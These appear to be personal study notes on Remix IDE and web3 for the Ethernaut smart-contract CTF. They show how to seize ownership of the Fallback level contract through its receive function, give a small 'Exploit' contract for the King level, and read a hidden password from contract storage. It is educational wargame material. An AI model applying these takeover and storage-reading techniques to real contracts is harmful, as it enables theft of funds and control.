## Remix IDE

## Interacting with contracts

### Payable functions
When calling on the abi of a contract, you can specify the value of the message by entering the value in the parentheses.
Notice how there are no arguments for the contribute function, but we can still add a payload of `value` to the message. This is because the `contribute` function is `payable`.

```
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
}

// Using the web3 library
contract.contribute({value: toWei("0.0005")})
```

### Targeting the receive function of a contract

In 1.Fallback of the Ethernaut CTFs, we can take control of the contract by sending eth directly to the contract address, which triggers the `receive` function.

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

We can do this by using the sendTransaction function of the web3 library.

```
contract.sendTransaction({value: toWei("0.001")})
```

More info:
https://solidity-by-example.org/sending-ether/
https://docs.soliditylang.org/en/v0.8.19/contracts.html#special-functions
https://blog.soliditylang.org/2020/03/26/fallback-receive-split/

## Remix

### Setting msg.value in the Remix console

In the LHS of the Remix console when deploying a contract, you can set the value of your message in Wei / Ether / etc.

```
contract Exploit{

    constructor(address payable _kingAddress) payable {
        _kingAddress.call{value: msg.value}("");
    }

}
```

## web3 library
### Useful functionality

```
// Gets the balance of a specificed EOA or contract address
web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec")
```

```
// Send transaction within web3 js environment
web3.eth.sendTransaction({to:'0x2eadef55007191c8e4be24df228a2e3e54e093d7', from:player, value: toWei("0.001")})
```

```
// Get the storage at a specific index of a contract
web3.eth.getStorageAt("0xAFe83D26Dd816488c89bf8cf925D8156f272676A", 1, (err,res)=>{console.log(res)});
```

```
// utility functions e.g. to convert hex to ascii
web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```